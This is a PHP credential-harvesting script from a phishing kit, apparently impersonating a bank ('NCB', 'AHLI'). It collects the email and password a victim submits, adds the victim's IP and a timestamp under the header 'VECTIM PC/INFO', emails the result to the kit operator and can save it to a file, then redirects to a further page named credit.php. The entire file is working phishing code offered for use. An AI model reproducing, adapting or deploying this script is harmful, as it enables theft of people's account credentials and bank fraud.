<?php 
/*		
*/
?>   
<?php
ini_set("output_buffering",4096);
session_start();
ob_start();

$random=rand(0,100000000000);
$md5=md5("$random");
$base=base64_encode($md5);
$host=md5("$base");

include ("config.php");
session_start();
$ip = getenv("REMOTE_ADDR");
$message .= "------------[ NCB Email Access ]-------------\n";
$message .= "Email Access   : ".$_POST['em']."\n";
$message .= "Password    : ".$_POST['ps']."\n";
$message .= "------------[ VECTIM PC/INFO ]-------------\n";
$message .= "IP			 : $ip\n";
$message .= "TIME		 : ".date("d/m/Y h:i:sa")." GMT\r\n";
$message .= "---------Created by - n0body---------------\n";
$subject = "AHLI Rezult - (Email Access) - $ip";
$headers = "From: www-data <rzlt@mydomain.com>";
if ($saveintext=="yes") {
	$save=fopen("../".$filename.".txt","a+");
	fwrite($save,$message);
	fclose($save);
}
mail($recipient,$subject,$message,$headers);
$header = "../credit.php?ID=$host$host$host$host$host";
header("Location: $header");
?>